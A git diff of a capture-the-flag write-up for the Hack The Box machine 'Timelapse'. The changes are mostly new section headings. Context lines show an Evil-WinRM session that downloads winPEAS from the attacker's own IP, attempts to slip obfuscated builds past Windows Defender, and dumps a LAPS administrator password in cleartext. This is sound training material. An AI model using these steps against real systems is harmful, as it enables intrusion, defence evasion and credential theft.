@@ -1,6 +1,6 @@
 # Timelapse - 10.10.11.152
 
-## Initial Recon
+## Recon
 
 ### Nmap 
 
@@ -288,6 +288,7 @@ In directory 'HelpDesk', we have three LAPS documentation files. Having not been
 
 Also in this directory is the installer for LAPS. There is nothing out of the ordinary with this installer. 
 
+## Access as legacyy
 
 In directory 'Dev' we have archive winrm_backup.zip
  - Upon unzipping, we are prompted for a password for legacyy_dev_auth.pfx
@@ -412,7 +413,7 @@ Enter PEM pass phrase:
 Verifying - Enter PEM pass phrase:
 ```
 
-### Win-RM Session as legacyy
+### Win-RM Session
 
 We can begin a Win-RM session in the following way to get a session as legacyy. Note that while the default port for win-RM is 5985, because we are using SSL session flags, evil-winrm detects that we should use win-rm ssl port 5986 without having to specify it.
 
@@ -482,7 +483,7 @@ At line:1 char:1
     + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
 ```
 
-Upon searching the disk for useful files, I've found nothing of interest. I'll turn to winPEAS.
+Upon searching the disk for useful files, I've found nothing of interest. I'll try winPEAS.
 
 ```
 *Evil-WinRM* PS C:\Users\legacyy\Documents> iwr -uri http://10.10.16.8/winPEASany.exe -outfile wp.exe
@@ -504,6 +505,8 @@ At line:1 char:1
 ```
 
 winPEAS releases has file winPEASany_ofs.exe which would indicate an obsfucated version of the winpeas executable. Upon trying this, it is also flagged by Windows Defender. Upon trying winPEASx64_ofs.exe, we have success, however nothing of great value is recovered from this scan.
+
+## Access as svc_deploy
 
 ### LAPS Enumeration
 
@@ -668,7 +671,7 @@ svc_deploy user        CN=svc_deploy,CN=Users,DC=timelapse,DC=htb
 
 ### Bloodhound
 
-Using Bloodhound, I find nothing that indicates the existence of an Active Directory traversal method that would allow us to pivot into svc_deploy, however - the following is what I tried:
+Using Bloodhound, I find nothing that indicates the existence of an Active Directory traversal method that would allow us access to user svc_deploy, however - the following is what I tried:
 
 The new SharpHound.exe does not appear to be working on any box I've tried it on. Additionally, SharpHound.ps1 was removed from the github repo. Following the steps here (grabbing SharpHound.ps1 from a previous commit and downloading Bloodhound version 4.0.3) is the easiest way to repair a bloodhound install.
 
@@ -754,6 +757,10 @@ Upon following the steps to create the PSCredential object and invoke command 'w
 Enter PEM pass phrase:
 timelapse\svc_deploy
 ```
+
+## Priv: svc_deploy -> administrator
+
+### Dump LAPS Password
 
 Returning to the LAPS pentesting guide we used earlier, we can copy a powershell command that will allow us to dump the LAPS password in cleartext, and place this inside the script block. We successfully get the LAPS admin password, 'O2]Br]z.tWI%(0G79c5Z8g2$'
 
